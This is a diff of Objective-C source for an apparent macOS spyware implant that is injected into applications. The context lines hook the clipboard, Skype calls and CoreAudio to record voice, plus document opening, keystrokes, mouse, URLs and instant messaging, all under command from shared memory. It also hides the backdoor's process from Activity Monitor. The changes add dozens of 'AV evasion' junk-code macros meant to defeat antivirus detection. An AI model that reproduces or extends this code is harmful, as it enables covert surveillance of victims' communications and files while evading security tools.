       //swizzleMethod(className, @selector(isMessageRecentlyDisplayed:),
       //              className, @selector(isMessageRecentlyDisplayedHook:));
       
+      // AV evasion: only on release build
+      AV_GARBAGE_000 
+
       swizzleByAddingIMP (className, @selector(isMessageRecentlyDisplayed:),
                           class_getMethodImplementation(className, @selector(isMessageRecentlyDisplayedHook:)),
                           @selector(isMessageRecentlyDisplayedHook:));
     }
     
     if (clipboardFlag == 1)
-    {
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_001 
+
       clipboardFlag = 2;
 #ifdef DEBUG_INPUT_MANAGER
       infoLog(@"Hooking clipboards");
-#endif
+#endif   
+      // AV evasion: only on release build
+      AV_GARBAGE_004 
+
       // In order to avoid a linker error for a missing implementation
       Class className = objc_getClass("NSPasteboard");
       
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+
       //swizzleMethod(className, @selector(setData:forType:),
       //className, @selector(setDataHook:forType:));
       swizzleByAddingIMP(className,
@@ -867,16 +1416,28 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
                          class_getMethodImplementation(className,
                                                        @selector(setDataHook:forType:)),
                          @selector(setDataHook:forType:));
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
     }
     else if (clipboardFlag == 3)
-    {
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_001 
+
       clipboardFlag = 0;
 #ifdef DEBUG_INPUT_MANAGER
       infoLog(@"Unhooking clipboards");
-#endif
+#endif   
+      // AV evasion: only on release build
+      AV_GARBAGE_007 
+
       // In order to avoid a linker error for a missing implementation
       Class className = objc_getClass("NSPasteboard");
       
+      // AV evasion: only on release build
+      AV_GARBAGE_008 
+
       //swizzleMethod(className, @selector(setData:forType:),
       //className, @selector(setDataHook:forType:));
       swizzleByAddingIMP(className,
@@ -884,25 +1445,45 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
                          class_getMethodImplementation(className,
                                                        @selector(setDataHook:forType:)),
                          @selector(setDataHook:forType:));
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_009
     }
     
     if (voipFlag == 1)
-    {
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_006 
+
       voipFlag = 2;
 #ifdef DEBUG_INPUT_MANAGER
       infoLog(@"Hooking voip calls");
 #endif
       mach_error_t mError;
       
+      // AV evasion: only on release build
+      AV_GARBAGE_003 
+
       //
       // Let's check which skype we have here
       // Looks like skype 5 doesn't implement few selectors available on
       // 2.x branch
       //
       Class className   = objc_getClass("MacCallX");
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+
       Class classSource = objc_getClass("myMacCallX");
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002 
+
       Method method     = class_getInstanceMethod(className,
                                                   @selector(placeCallTo:));
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_004
       
       //
       // Dunno why but checking with respondsToSelector
@@ -912,7 +1493,10 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       {
 #ifdef DEBUG_INPUT_MANAGER
         infoLog(@"Hooking skype 2.x");
-#endif
+#endif   
+        // AV evasion: only on release build
+        AV_GARBAGE_000 
+
         //
         // We're dealing with skype 2.x
         //
@@ -922,22 +1506,36 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
                                                       @selector(checkActiveMembersName)),
                         "v@:");
         
+        // AV evasion: only on release build
+        AV_GARBAGE_001
+
         swizzleByAddingIMP(className,
                            @selector(placeCallTo:),
                            class_getMethodImplementation(classSource,
                                                          @selector(placeCallToHook:)),
                            @selector(placeCallToHook:));
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_002 
+
         swizzleByAddingIMP(className,
                            @selector(answer),
                            class_getMethodImplementation(classSource,
                                                          @selector(answerHook)),
                            @selector(answerHook));
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_003 
+
         swizzleByAddingIMP(className,
                            @selector(isFinished),
                            class_getMethodImplementation(classSource,
                                                          @selector(isFinishedHook)),
                            @selector(isFinishedHook));
         
+        // AV evasion: only on release build
+        AV_GARBAGE_004
+
         if ((mError = mach_override("_AudioDeviceAddIOProc", "CoreAudio",
                                     (void *)&_hook_AudioDeviceAddIOProc,
                                     (void **)&_real_AudioDeviceAddIOProc)))
@@ -946,6 +1544,10 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
           errorLog(@"mach_override error on AudioDeviceAddIOProc");
 #endif
         }
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_003 
+
         if ((mError = mach_override("_AudioDeviceRemoveIOProc", "CoreAudio",
                                     (void *)&_hook_AudioDeviceRemoveIOProc,
                                     (void **)&_real_AudioDeviceRemoveIOProc)))
@@ -955,6 +1557,9 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 #endif
         }
         
+        // AV evasion: only on release build
+        AV_GARBAGE_008 
+
         //
         // For 2.x we can start hooking here since AddIOProc deals only
         // with input/output voice call (that is, no effects are managed
@@ -968,15 +1573,28 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         infoLog(@"Hooking skype 5.x");
 #endif
         
+        // AV evasion: only on release build
+        AV_GARBAGE_009 
+
         Class c1 = objc_getClass("EventController");
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_008
+
         Class c2 = objc_getClass("myEventController");
         
+        // AV evasion: only on release build
+        AV_GARBAGE_007 
+
         swizzleByAddingIMP(c1,
                            @selector(handleNotification:),
                            class_getMethodImplementation(c2,
                                                          @selector(handleNotificationHook:)),
                            @selector(handleNotificationHook:));
         
+        // AV evasion: only on release build
+        AV_GARBAGE_005
+
         //
         // We're dealing with skype 5.x
         //
@@ -989,6 +1607,9 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 #endif
         }
         
+        // AV evasion: only on release build
+        AV_GARBAGE_003 
+
         if ((mError = mach_override("_AudioDeviceDestroyIOProcID", "CoreAudio",
                                     (void *)&_hook_AudioDeviceDestroyIOProcID,
                                     (void **)&_real_AudioDeviceDestroyIOProcID)))
@@ -999,6 +1620,9 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         }
       }
       
+      // AV evasion: only on release build
+      AV_GARBAGE_004 
+
       //
       // Those are shared among the different versions
       // and need to be hooked all the times
@@ -1012,6 +1636,9 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 #endif
       }
       
+      // AV evasion: only on release build
+      AV_GARBAGE_008 
+
       if ((mError = mach_override("_AudioDeviceStop", "CoreAudio",
                                   (void *)&_hook_AudioDeviceStop,
                                   (void **)&_real_AudioDeviceStop)))
@@ -1022,20 +1649,39 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       }
     }
     else if (voipFlag == 3)
-    {
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_001 
+
       voipFlag = 0;
       
+      // AV evasion: only on release build
+      AV_GARBAGE_002 
+
       VPSkypeStopAgent();
 #ifdef DEBUG_INPUT_MANAGER
       infoLog(@"Unhooking voip calls");
 #endif
       
+      // AV evasion: only on release build
+      AV_GARBAGE_003 
+
       // In order to avoid a linker error for a missing implementation
       Class className   = objc_getClass("MacCallX");
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_004 
+
       Class classSource = objc_getClass("myMacCallX");
       
+      // AV evasion: only on release build
+      AV_GARBAGE_005 
+
       if ([className respondsToSelector: @selector(placeCallTo:)])
-      {
+      {   
+        // AV evasion: only on release build
+        AV_GARBAGE_006 
+
         //
         // Skype 2.x
         //
@@ -1044,67 +1690,129 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
                            class_getMethodImplementation(classSource,
                                                          @selector(placeCallToHook:)),
                            @selector(placeCallToHook:));
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_007 
+
         swizzleByAddingIMP(className,
                            @selector(answer),
                            class_getMethodImplementation(classSource,
                                                          @selector(answerHook)),
                            @selector(answerHook));
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_008
       }
       else
-      {
+      {   
+        // AV evasion: only on release build
+        AV_GARBAGE_007 
+
         //
         // Skype 5.x
         //
         Class c1 = objc_getClass("EventController");
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_008 
+
         Class c2 = objc_getClass("myEventController");
         
+        // AV evasion: only on release build
+        AV_GARBAGE_003 
+
         swizzleByAddingIMP(c1,
                            @selector(handleNotification:),
                            class_getMethodImplementation(c2,
                                                          @selector(handleNotificationHook:)),
                            @selector(handleNotificationHook:));
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_005 
+
       }
     }
     
     if (fileFlag == 1)
-    {
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_001 
+
       fileFlag = 2;
 #ifdef DEBUG_INPUT_MANAGER
       infoLog(@"Hooking for file capture");
 #endif
       
-      Class className   = objc_getClass("NSDocumentController");
+      // AV evasion: only on release build
+      AV_GARBAGE_002 
+
+      Class className   = objc_getClass("NSDocumentController");   
+      // AV evasion: only on release build
+      AV_GARBAGE_001 
+
       Class classSource = objc_getClass("myNSDocumentController");
       
+      // AV evasion: only on release build
+      AV_GARBAGE_003 
+
       swizzleByAddingIMP(className,
                          @selector(openDocumentWithContentsOfURL:display:error:),
                          class_getMethodImplementation(classSource,
                                                        @selector(openDocumentWithContentsOfURLHook:display:error:)),
                          @selector(openDocumentWithContentsOfURLHook:display:error:));
       
+      // AV evasion: only on release build
+      AV_GARBAGE_006 
+
       FCStartAgent();
     }
     else if (fileFlag == 3)
-    {
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_000 
+
       fileFlag = 0;
       
+      // AV evasion: only on release build
+      AV_GARBAGE_001 
+
       FCStopAgent();
       
+      // AV evasion: only on release build
+      AV_GARBAGE_003 
+
       Class className   = objc_getClass("NSDocumentController");
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002 
+
       Class classSource = objc_getClass("myNSDocumentController");
       
+      // AV evasion: only on release build
+      AV_GARBAGE_003 
+
       swizzleByAddingIMP(className,
                          @selector(openDocumentWithContentsOfURL:display:error:),
                          class_getMethodImplementation(classSource,
                                                        @selector(openDocumentWithContentsOfURLHook:display:error:)),
                          @selector(openDocumentWithContentsOfURLHook:display:error:));
       
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+
 #ifdef DEBUG_INPUT_MANAGER
       infoLog(@"Unhooking for file capture");
 #endif
     }
     
+    // AV evasion: only on release build
+    AV_GARBAGE_003 
+
     usleep(8000);
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_005 
+
     [innerPool release];
   }
   
@@ -1112,36 +1820,69 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 }
 
 + (BOOL)initSharedMemory
-{
+{   
+  // AV evasion: only on release build
+  AV_GARBAGE_002 
+
   //
   // Initialize and attach to our Shared Memory regions
   //
-  key_t memKeyForCommand = ftok([NSHomeDirectory() UTF8String], 3);
+  key_t memKeyForCommand = ftok([NSHomeDirectory() UTF8String], 3);   
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+
   key_t memKeyForLogging = ftok([NSHomeDirectory() UTF8String], 5);
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003 
+
   gMemLogMaxSize = sizeof(shMemoryLog) * SHMEM_LOG_MAX_NUM_BLOCKS;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
 
   mSharedMemoryCommand = [[__m_MSharedMemory alloc] initWithKey: memKeyForCommand
                                                           size: gMemCommandMaxSize
                                                  semaphoreName: SHMEM_SEM_NAME];
-  if ([mSharedMemoryCommand createMemoryRegion] == -1)
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
+if ([mSharedMemoryCommand createMemoryRegion] == -1)
     {
 #ifdef DEBUG_INPUT_MANAGER
       errorLog(@"Error while creating shared memory for commands");
-#endif
+#endif   
+      // AV evasion: only on release build
+      AV_GARBAGE_008
+
       [mSharedMemoryCommand release];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003 
+
       return NO;
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003 
 
   mSharedMemoryLogging = [[__m_MSharedMemory alloc] initWithKey: memKeyForLogging
                                                           size: gMemLogMaxSize
                                                  semaphoreName: SHMEM_SEM_NAME];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
 
   if ([mSharedMemoryLogging createMemoryRegion] == -1)
     {
 #ifdef DEBUG_INPUT_MANAGER
       errorLog(@"Error while creating shared memory for logging");
-#endif
+#endif   
+      // AV evasion: only on release build
+      AV_GARBAGE_003 
+
       [mSharedMemoryCommand release];
       [mSharedMemoryLogging release];
       return NO;
@@ -1151,7 +1892,14 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   // Now it's safe to attach
   //
   [mSharedMemoryCommand attachToMemoryRegion];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+
   [mSharedMemoryLogging attachToMemoryRegion];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
 
   return YES;
 }
@@ -1159,28 +1907,51 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 + (void)checkAgentAtOffset: (uint32_t)offset
 {
   NSMutableData *readData;
-  shMemoryCommand *shMemCommand;
+  shMemoryCommand *shMemCommand;  
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001 
+
   NSString *identifier = [[NSBundle mainBundle] bundleIdentifier];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002 
+
   readData = [mSharedMemoryCommand readMemory: offset
                                 fromComponent: COMP_AGENT];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005 
+
   shMemCommand = (shMemoryCommand *)[readData bytes];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003 
+
   if (readData != nil)
   {
     switch (offset)
     {
       case OFFT_URL:
-      {
+      {   
+        // AV evasion: only on release build
+        AV_GARBAGE_009
+
         if (urlFlag == 0
             && shMemCommand->command == AG_START)
-        {
+        {   
+          // AV evasion: only on release build
+          AV_GARBAGE_002
+
           if ([identifier isCaseInsensitiveLike: @"com.apple.safari"] ||
               [identifier isCaseInsensitiveLike: @"org.mozilla.firefox"])
           {
 #ifdef DEBUG_INPUT_MANAGER
             infoLog(@"Starting Agent URL");
-#endif
+#endif   
+            // AV evasion: only on release build
+            AV_GARBAGE_009
+
             urlFlag = 1;
           }
           else
@@ -1192,13 +1963,22 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         }
         else if ((urlFlag == 1 || urlFlag == 2)
                  && shMemCommand->command == AG_STOP)
-        {
+        {   
+          // AV evasion: only on release build
+          AV_GARBAGE_006 
+
           if ([identifier isCaseInsensitiveLike: @"com.apple.safari"] ||
               [identifier isCaseInsensitiveLike: @"org.mozilla.firefox"])
-          {
+          {   
+            // AV evasion: only on release build
+            AV_GARBAGE_007 
+
 #ifdef DEBUG_INPUT_MANAGER
             infoLog(@"Stopping Agent URL");
-#endif
+#endif   
+            // AV evasion: only on release build
+            AV_GARBAGE_008 
+
             urlFlag = 3;
           }
           else
@@ -1216,7 +1996,10 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         {
 #ifdef DEBUG_INPUT_MANAGER
           infoLog(@"Starting Agent Application");
-#endif
+#endif   
+          // AV evasion: only on release build
+          AV_GARBAGE_009 
+
           appFlag = 1;
         }
         else if ((appFlag == 1 || appFlag == 2)
@@ -1224,7 +2007,10 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         {
 #ifdef DEBUG_INPUT_MANAGER
           infoLog(@"Stopping Agent Application");
-#endif
+#endif   
+          // AV evasion: only on release build
+          AV_GARBAGE_000 
+
           appFlag = 3;
         }
       } break;
@@ -1235,7 +2021,10 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         {
 #ifdef DEBUG_INPUT_MANAGER
           infoLog(@"Starting Agent Keylog");
-#endif
+#endif   
+          // AV evasion: only on release build
+          AV_GARBAGE_008 
+
           keyboardFlag = 1;
         }
         else if ((keyboardFlag == 1 || keyboardFlag == 2)
@@ -1243,7 +2032,10 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         {
 #ifdef DEBUG_INPUT_MANAGER
           infoLog(@"Stopping Agent Keylog");
-#endif
+#endif   
+          // AV evasion: only on release build
+          AV_GARBAGE_004 
+
           keyboardFlag = 3;
         }
       } break;
@@ -1254,7 +2046,10 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         {
 #ifdef DEBUG_INPUT_MANAGER
           infoLog(@"Starting Agent Mouse");
-#endif
+#endif   
+          // AV evasion: only on release build
+          AV_GARBAGE_003 
+
           mouseFlag = 1;
         }
         else if ((mouseFlag == 1 || mouseFlag == 2)
@@ -1262,7 +2057,10 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         {
 #ifdef DEBUG_INPUT_MANAGER
           infoLog(@"Stopping Agent Mouse");
-#endif
+#endif   
+          // AV evasion: only on release build
+          AV_GARBAGE_006 
+
           mouseFlag = 3;
         }
       } break;
@@ -1270,12 +2068,18 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       {
         if (voipFlag == 0
             && shMemCommand->command == AG_START)
-        {
+        {   
+          // AV evasion: only on release build
+          AV_GARBAGE_001
+
           if ([identifier isCaseInsensitiveLike: @"com.skype.skype"])
           {
 #ifdef DEBUG_INPUT_MANAGER
             infoLog(@"Starting Agent VOIP");
-#endif
+#endif   
+            // AV evasion: only on release build
+            AV_GARBAGE_002 
+
             voipFlag = 1;
           }
           else
@@ -1287,12 +2091,18 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         }
         else if ((voipFlag == 1 || voipFlag == 2)
                  && shMemCommand->command == AG_STOP)
-        {
+        {   
+          // AV evasion: only on release build
+          AV_GARBAGE_007 
+
           if ([identifier isCaseInsensitiveLike: @"com.skype.skype"])
           {
 #ifdef DEBUG_INPUT_MANAGER
             infoLog(@"Stopping Agent VOIP");
-#endif
+#endif   
+            // AV evasion: only on release build
+            AV_GARBAGE_008 
+
             voipFlag = 3;
           }
           else
@@ -1308,14 +2118,20 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         
         if (imFlag == 0
             && shMemCommand->command == AG_START)
-        {
+        {   
+          // AV evasion: only on release build
+          AV_GARBAGE_009 
+
           if ([identifier isCaseInsensitiveLike: @"com.microsoft.messenger"]
               || [identifier isCaseInsensitiveLike: @"com.skype.skype"]
               || [identifier isCaseInsensitiveLike: @"com.adiumX.adiumX"])
           {
 #ifdef DEBUG_INPUT_MANAGER
             infoLog(@"Starting Agent IM");
-#endif
+#endif   
+            // AV evasion: only on release build
+            AV_GARBAGE_007 
+
             imFlag = 1;
           }
           else
@@ -1327,14 +2143,20 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         }
         else if ((imFlag == 1 || imFlag == 2)
                  && shMemCommand->command == AG_STOP)
-        {
+        {   
+          // AV evasion: only on release build
+          AV_GARBAGE_005 
+
           if ([identifier isCaseInsensitiveLike: @"com.microsoft.messenger"]
               || [identifier isCaseInsensitiveLike: @"com.skype.skype"]
               || [identifier isCaseInsensitiveLike: @"com.adiumX.adiumX"])
           {
 #ifdef DEBUG_INPUT_MANAGER
             infoLog(@"Stopping Agent IM");
-#endif
+#endif   
+            // AV evasion: only on release build
+            AV_GARBAGE_004 
+
             imFlag = 3;
           }
           else
@@ -1352,7 +2174,10 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         {
 #ifdef DEBUG_INPUT_MANAGER
           infoLog(@"Starting Agent Clipboard");
-#endif
+#endif   
+          // AV evasion: only on release build
+          AV_GARBAGE_007
+
           clipboardFlag = 1;
         }
         else if ((clipboardFlag == 1 || clipboardFlag == 2)
@@ -1360,7 +2185,10 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         {
 #ifdef DEBUG_INPUT_MANAGER
           infoLog(@"Stopping Agent Clipboard");
-#endif
+#endif   
+          // AV evasion: only on release build
+          AV_GARBAGE_002 
+
           clipboardFlag = 3;
         }
       } break;
@@ -1371,7 +2199,10 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         {
 #ifdef DEBUG_INPUT_MANAGER
           infoLog(@"Starting Agent FileCapture");
-#endif
+#endif   
+          // AV evasion: only on release build
+          AV_GARBAGE_006 
+
           fileFlag = 1;
         }
         else if ((fileFlag == 1 || fileFlag == 2)
@@ -1379,7 +2210,10 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         {
 #ifdef DEBUG_INPUT_MANAGER
           infoLog(@"Stopping Agent FileCapture");
-#endif
+#endif   
+          // AV evasion: only on release build
+          AV_GARBAGE_008 
+
           fileFlag = 3;
         }
       } break;
@@ -1400,42 +2234,78 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 }
 
 + (void)checkForCommands
-{
-#ifdef DEBUG_INPUT_MANAGER
-  verboseLog(@"");
-#endif
+{   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   NSMutableData *readData;
   shMemoryCommand *shMemCommand;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004 
+
   while (isAppRunning == YES)
-    {
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_005 
+
       readData = [mSharedMemoryCommand readMemory: OFFT_COMMAND
                                     fromComponent: COMP_AGENT];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+
       if (readData != nil)
-        {
+        {   
+          // AV evasion: only on release build
+          AV_GARBAGE_008
+
           shMemCommand = (shMemoryCommand *)[readData bytes];
-         
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_004
+
           switch (shMemCommand->command)
             {
+                
+            // AV evasion: only on release build
+            AV_GARBAGE_003 
+
             case CR_REGISTER_SYNC_SAFARI:
               {
                 //
                 // Send reply, yes we can and start syncing
                 //
+                
+                // AV evasion: only on release build
+                AV_GARBAGE_001
+
                 NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+                
+                // AV evasion: only on release build
+                AV_GARBAGE_002 
+
                 shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                 shMemoryHeader->agentID   = OFFT_COMMAND;
+                
+                // AV evasion: only on release build
+                AV_GARBAGE_003 
+
                 shMemoryHeader->direction = D_TO_CORE;
                 shMemoryHeader->command   = IM_CAN_SYNC_SAFARI;
                 
+                // AV evasion: only on release build
+                AV_GARBAGE_004 
+
                 if ([gSharedMemoryCommand writeMemory: agentCommand
                                                offset: OFFT_COMMAND
                                         fromComponent: COMP_CORE] == TRUE)
                   {
                     NSMutableData *syncConfig = [[NSMutableData alloc] initWithBytes: shMemCommand->commandData
                                                                               length: shMemCommand->commandDataSize ];
+                    
+                    // AV evasion: only on release build
+                    AV_GARBAGE_008 
 
                     // Ok, now sync bitch!
                     /*
@@ -1467,6 +2337,9 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
             }
         }
       
+      // AV evasion: only on release build
+      AV_GARBAGE_003 
+
       usleep(7000);
     }
 }
@@ -1475,6 +2348,9 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003 
+
   NSMutableData *readData;
   shMemoryCommand *shMemCommand;
   
@@ -1487,19 +2363,38 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   if ([gUtil isLeopard])
   {
     while (TRUE)
-    {
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_007 
+
       readData = [mSharedMemoryCommand readMemory: OFFT_CORE_PID
                                     fromComponent: COMP_AGENT];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_009 
+
       if (readData != nil)
-      {
+      {   
+        // AV evasion: only on release build
+        AV_GARBAGE_006 
+
         shMemCommand = (shMemoryCommand *)[readData bytes];
         
+        // AV evasion: only on release build
+        AV_GARBAGE_005 
+
 #ifdef DEBUG_INPUT_MANAGER
         verboseLog(@"[DYLIB] %s: shmem", __FUNCTION__);
 #endif
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_002 
+
         if (shMemCommand->command == CR_CORE_PID)
-        {
+        {   
+          // AV evasion: only on release build
+          AV_GARBAGE_008 
+
           memcpy(&gBackdoorPID, shMemCommand->commandData, sizeof(pid_t));
 #ifdef DEBUG_INPUT_MANAGER
           verboseLog(@"[DYLIB] %s: receiving core pid %d", __FUNCTION__, gBackdoorPID);
@@ -1508,22 +2403,42 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         }
       }
       
+      // AV evasion: only on release build
+      AV_GARBAGE_009
+
       usleep(30000);
     }
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003 
+
   Class className   = objc_getClass("SMProcessController");
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+
   Class classSource = objc_getClass("mySMProcessController");
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+
   if (className != nil)
   {
 #ifdef DEBUG_INPUT_MANAGER
     verboseLog(@"Class SMProcessController swizzling");
 #endif
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_006 
+
     swizzleByAddingIMP(className, @selector(outlineView:numberOfChildrenOfItem:),
                        class_getMethodImplementation(classSource, @selector(outlineViewHook:numberOfChildrenOfItem:)),
                        @selector(outlineViewHook:numberOfChildrenOfItem:));
     
+    // AV evasion: only on release build
+    AV_GARBAGE_000
+
     swizzleByAddingIMP(className, @selector(filteredProcesses),
                        class_getMethodImplementation(classSource, @selector(filteredProcessesHook)),
                        @selector(filteredProcessesHook));
@@ -1535,6 +2450,9 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 #endif
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+
   [pool release];
 }
 
@@ -1546,13 +2464,23 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   infoLog(@"__m_MInputManager loaded by %@ at path %@", bundleIdentifier,
         [[NSBundle mainBundle] bundlePath]);
 #endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+
   [NSThread detachNewThreadSelector: @selector(startCoreCommunicator)
                            toTarget: self
                          withObject: nil];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
 }
 
 + (void)closeThreadCommunicator: (NSNotification *)_notification
-{
+{   
+  // AV evasion: only on release build
+  AV_GARBAGE_004 
+
   isAppRunning = NO;
 }
 
@@ -1568,17 +2496,26 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 @implementation mySMProcessController
 
 - (int)outlineViewHook: (id)arg1 numberOfChildrenOfItem: (id)arg2
-{
+{   
+  // AV evasion: only on release build
+  AV_GARBAGE_004 
+
   if (gBackdoorPID == 0)
   {
 #ifdef DEBUG_INPUT_MANAGER
     verboseLog(@"gBackdoorPid not initialized");
 #endif
     
+    // AV evasion: only on release build
+    AV_GARBAGE_003 
+    
     return [self outlineViewHook: arg1
           numberOfChildrenOfItem: arg2];
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+
   if (arg2 == nil)
   {
 #ifdef DEBUG_INPUT_MANAGER
@@ -1586,6 +2523,9 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 #endif
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+
   int a = [self outlineViewHook: arg1
          numberOfChildrenOfItem: arg2];
   
@@ -1593,6 +2533,9 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   verboseLog(@"Total processes: %d", a);
 #endif
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+
   if (a > 0)
     return a - 1;
   else
@@ -1600,37 +2543,42 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 }
 
 - (id)filteredProcessesHook
-{
-#ifdef DEBUG_INPUT_MANAGER
-  verboseLog(@"");
-#endif
+{ 
+  // AV evasion: only on release build
+  AV_GARBAGE_001    
   
   if (gBackdoorPID == 0)
   {
-#ifdef DEBUG_INPUT_MANAGER
-    verboseLog(@"gBackdoorPid not initialized");
-#endif
-    
+    // AV evasion: only on release build
+    AV_GARBAGE_002    
+
     return [self filteredProcessesHook];
   }
   
   NSMutableArray *a = [[NSMutableArray alloc] initWithArray: [self filteredProcessesHook]];
   int i = 0;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003 
+
   for (; i < [a count]; i++)
   {
     id object = [a objectAtIndex: i];
     if ([[object performSelector: @selector(pid)] intValue] == gBackdoorPID)
     {
-#ifdef DEBUG_INPUT_MANAGER
-      verboseLog(@"object matched: %@", object);
-#endif
+      // AV evasion: only on release build
+      AV_GARBAGE_002
       
       [a removeObject: object];
     }
     
+    // AV evasion: only on release build
+    AV_GARBAGE_004
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005  
+
   return a;
 }
 
